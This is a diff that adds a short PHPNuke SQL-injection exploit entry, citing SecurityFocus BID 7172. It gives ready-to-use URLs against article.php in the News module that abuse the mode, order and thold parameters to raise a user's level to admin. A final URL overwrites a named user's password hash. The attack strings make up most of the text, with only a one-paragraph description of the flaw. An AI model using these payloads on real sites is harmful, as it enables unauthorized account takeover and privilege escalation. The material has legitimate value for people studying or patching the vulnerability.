@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/7172/info
+
+It has been reported that an input validation error exists in the article.php file included with PHPNuke as part of the News module. Because of this, an attacker could send a malicious string through PHPNuke that would allow the attacker to manipulate the database, and gain unauthorized access to user accounts.
+
+if magic_quotes_gpc=OFF :
+
+Change our level (into admin) :
+http://www.example.com/modules.php?name=News&file=article&sid=1&save=1&mode=',user_level='4
+
+or
+
+http://www.example.com/modules.php?name=News&file=article&sid=1&save=1&order=',user_level='4
+
+or
+
+http://www.example.com/modules.php?name=News&file=article&sid=1&save=1&thold=',user_level='4
+
+
+Change the user Bob's password :
+http://www.example.com/modules.php?name=News&file=article&sid=1&save=1&order=',pass='d41d8cd98f00b204e9800998ecf8427e'%20where%20uname='Bob'/*
